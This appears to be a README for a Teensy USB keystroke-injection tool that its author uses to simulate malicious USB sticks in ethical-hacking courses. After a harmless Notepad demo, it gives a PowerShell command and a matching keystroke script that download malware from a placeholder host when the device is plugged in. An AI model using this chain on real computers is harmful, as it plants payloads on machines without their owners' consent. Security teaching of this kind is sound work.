# teensy
Tools and projects all around the Teensy USB Development Board

## teensy_keyboard

Based on the Keyboard-Library and example from the Teensy Homepage:
https://www.pjrc.com/teensy/index.html

This program allows you to define a very simple string which is parsed and
sent as Keystrokes to the Computer after the Teensy gets pluged in.

I created this to simulate Malicious USB-Sticks in Ethical-Hackin courses
and presentations withing [ThinkArena](http://www.denkarena.ch/)

### Commands and Format

The String can be of Keystrokes, Strings and Pause:
* The `K:` is used to simulate a KeyStroke with a modifier key
* The `S:` is used to write a string and send the ENTER key at the end
* The `W:` is used to wait the given amount of milliseconds before the next line is processed

**Example**

Open Notepad and write something:
```
K: WIN R
W: 50
S: notepad
W: 200
S: You've just inserted a malicious USB-Stick.
S: Always take care about what you're connection
S: Cheers...
```

### Downlaod in Windows

Under Windows you can use something like this on Windows to download Maleware in a Powershell:

```Batchfile
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://www.example.com/file.exe", "C:\")
```

This would result in a String like this:
```
K: WIN R
W: 50
S: powershell
S: $client = New-Object System.Net.WebClient
S: $client.DownloadFile("http://www.example.com/file.exe", "C:\")
```

